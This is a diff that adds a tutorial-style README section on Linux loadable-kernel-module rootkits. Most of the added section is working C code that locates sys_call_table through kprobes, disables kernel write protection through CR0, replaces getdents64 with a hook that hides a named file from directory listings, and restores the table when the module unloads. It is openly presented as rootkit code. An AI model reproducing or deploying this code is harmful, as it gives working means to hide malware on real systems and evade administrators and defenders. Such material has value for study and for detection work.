@@ -299,3 +299,114 @@ ret = del_timer_sync(&procmonitor_timer);
 
 - Removes the timer synchronously, ensuring that the callback function is not running on another CPU.
 
+
+<p>lkm rootkit, lkm rootkits work by hooking a specific system call, which can hide malware and malicious applications. Now let's delve deeper into the lkm rootkits.</p>
+
+
+<h4> What is Hooking: </h4>
+
+Hooking is the act of redirecting/modifying a certain code stream, this redirect technique can be used for good and for bad, a big example of using this technique is mid function hooking This time I saw an example midFunction hook in the Unknown cheats forum that created a function jmp 0xE9 at address pAddres I won’t take much of your time explaining how it works and such because there are articles about it, I left two articles at the end of this readme, mine where I explain in depth about lkm and the one about MidFunction hook.
+
+And how does it hook the syscall?
+
+1) Find the Syscalls Table:
+
+The find_syscall_table function uses the kprobes module to find the address of the kernel syscall table (sys_call_table).
+
+unsigned long *find_syscall_table(void)
+{
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
+    kallsyms_lookup_name_t kallsyms_lookup_name;
+
+    register_kprobe(&kp);
+    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
+    unregister_kprobe(&kp);
+
+    __syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+    return __syscall_table;
+}
+2) Unprotect Memory
+
+The unprotect_memory function disables write protection on the page containing the syscall table, allowing the rootkit to modify the syscall table.
+
+static inline void unprotect_memory(void)
+{
+    write_cr0_forced(cr0 & ~0x00010000);
+}
+3) Replace the Original Function
+
+In ghost_init, the address of the original getdents64 syscall is saved and replaced with the address of the hook function (hook_getdents64).
+
+
+static int __init ghost_init(void)
+{
+    __syscall_table = find_syscall_table();
+    if (!__syscall_table) {
+        printk(KERN_INFO "Error, syscall_table not found");
+        return -1;
+    }
+
+    cr0 = read_cr0();
+    orig_getdents64 = (void *)__syscall_table[MY_NR_getdents];
+    unprotect_memory();
+    __syscall_table[MY_NR_getdents] = (unsigned long)hook_getdents64;
+    protect_memory();
+
+    printk(KERN_INFO "Rootkit loaded: Syscall hooked\n");
+    return 0;
+}
+4) Protect Memory
+
+After replacement, write protection is restored.
+
+static inline void protect_memory(void)
+{
+    write_cr0_forced(cr0);
+}
+5) Interception and Manipulation
+
+The hook function hook_getdents64 intercepts calls to getdents64, checks file names, and hides any file named file_to_hide.
+
+asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    int ret = orig_getdents64(fd, dirp, count);
+    struct linux_dirent64 *d, *kd, *kdirent = NULL;
+    unsigned long offset = 0;
+
+    if (ret <= 0)
+        return ret;
+
+    kdirent = kzalloc(ret, GFP_KERNEL);
+    if (kdirent == NULL)
+        return ret;
+
+    if (copy_from_user(kdirent, dirp, ret)) {
+        kfree(kdirent);
+        return ret;
+    }
+
+    while (offset < ret) {
+        d = (struct linux_dirent64 *)((char *)kdirent + offset);
+        if (strcmp(d->d_name, "file_to_hide") == 0) {
+            memmove(d, (char *)d + d->d_reclen, ret - offset - d->d_reclen);
+            ret -= d->d_reclen;
+        } else {
+            offset += d->d_reclen;
+        }
+    }
+
+    copy_to_user(dirp, kdirent, ret);
+    kfree(kdirent);
+    return ret;
+}
+6) Unloading and Restoring
+
+When unloading the module, the original syscall is restored:
+
+static void __exit ghost_exit(void)
+{
+    unprotect_memory();
+    __syscall_table[MY_NR_getdents] = (unsigned long)orig_getdents64;
+    protect_memory();
+
+    printk(KERN_INFO "Rootkit unloaded: Syscall restored\n");
+}
